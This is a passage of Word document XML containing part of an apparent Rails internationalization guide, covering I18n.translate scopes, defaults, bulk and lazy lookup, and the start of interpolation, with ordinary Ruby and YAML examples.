              <w:t>I18n.t :message</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AD4F3E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t 'message'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BE87304" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>translate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method also takes a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:scope</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option which can contain one or more additional keys that will be used to specify a “namespace” or scope for a translation key:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2430A1A5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F914C81" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="515075308"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :record_invalid, :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [:activerecord, :errors, :messages]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="78B5F3EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This looks up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:record_invalid</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> message in the Active Record error messages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775BEC1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Additionally, both the key and scopes can be specified as dot-separated keys as in:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2DEE1163" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C7E2214" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="514152531"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.translate "activerecord.errors.messages.record_invalid"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="211DDEAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Thus the following calls are equivalent:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="682C103F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11F47947" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t 'activerecord.errors.messages.record_invalid'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6ADD57E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t 'errors.messages.record_invalid', :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="488150B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :record_invalid, :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'activerecord.errors.messages'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24017D2E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :record_invalid, :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [:activerecord, :errors, :messages]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D78261D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.2 Defaults</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055B0F97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:default</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option is given, its value will be returned if the translation is missing:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4608"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="526FAA6B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1171BA72" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :missing, :default</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Not here'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="530A6FCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; 'Not here'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="20E9A563" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:default</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> value is a Symbol, it will be used as a key and translated. One can provide multiple values as default. The first one that results in a value will be returned.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7A8AA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">E.g., the following first tries to translate the key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:missing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and then the key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:also_missing.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> As both do not yield a result, the string “Not here” will be returned:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6648"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3DC093AE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E24F6C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t :missing, :default</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [:also_missing, 'Not here']</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B1C74FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; 'Not here'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1FEE539A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.3 Bulk and Namespace Lookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150A092C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To look up multiple translations at once, an array of keys can be passed:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5808"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2E131C19" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D0EA8BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t [:odd, :even], :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'errors.messages'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="766C26A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; ["must be odd", "must be even"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E29BFAD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Also, a key can translate to a (potentially nested) hash of grouped translations. E.g., one can receive </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Active Record error messages as a Hash with:</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67C8604" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12AB2C76" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t 'activerecord.errors.messages'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BD571D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; { :inclusion =&gt; "is not included in the list", :exclusion =&gt; ... }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="022E238B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.4 “Lazy” Lookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F16480A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails implements a convenient way to look up the locale inside </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>views</w:t>
      </w:r>
      <w:r>
        <w:t>. When you have the following dictionary:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4E4AEB74" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54D6787B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>es:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42D8F727" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  books:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="188E5F4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    index:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28EAAF11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      title: "Título"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B379789" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">you can look up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>books.index.title</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> value </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>inside</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/books/index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template like this (note the dot):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1968"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="098683FB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EBD26CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1280650335"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%= t '.title'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0881F12E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Interpolation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0E1FA3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In many cases you want to abstract your translations so that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>variables can be interpolated into the translation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. For this reason the I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provides an interpolation feature.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E0BDAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">All options besides </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:default</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:scope</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that are passed to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#translate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be interpolated to the translation:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7728"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="22DA0B1C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CD993A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.backend.store_translations :en, :thanks</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Thanks %{name}!'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42024688" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.translate :thanks, :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Jeremy'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C58B9BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
